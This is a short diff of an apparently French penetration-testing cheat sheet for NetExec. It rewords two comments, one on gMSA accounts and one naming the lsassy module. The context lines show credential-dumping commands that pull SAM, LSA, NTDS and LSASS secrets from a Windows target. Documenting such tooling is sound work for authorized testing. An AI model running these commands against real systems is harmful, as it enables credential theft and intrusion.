@@ -1451,7 +1451,7 @@ nxc smb target -u [username] -p [password] --sam
 ```bash
 netexec smb target -u [username] -p [password] --local-auth --lsa
 
-# Si vous avez trouvé un compte commençant par  SC GMSA {84A78B8C-56EE-465b-8496-FFB35A1B52A7}, vous pouvez récupérer le compte en utilisant gMSA ci-dessous.
+# Un compte dont le nom commence par _SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7} peut être lié à un compte gMSA ; vérifier l'association avec la méthode ci-dessous.
 ```
 
 
@@ -1463,7 +1463,7 @@ netexec smb target -u [username] -p [password] --ntds
 
 
 ```bash
-# Utilisation de Lsassey
+# Utilisation du module lsassy
 nxc smb target -u [username] -p [password] -M lsassy
 
 # Utilisation de nanodump
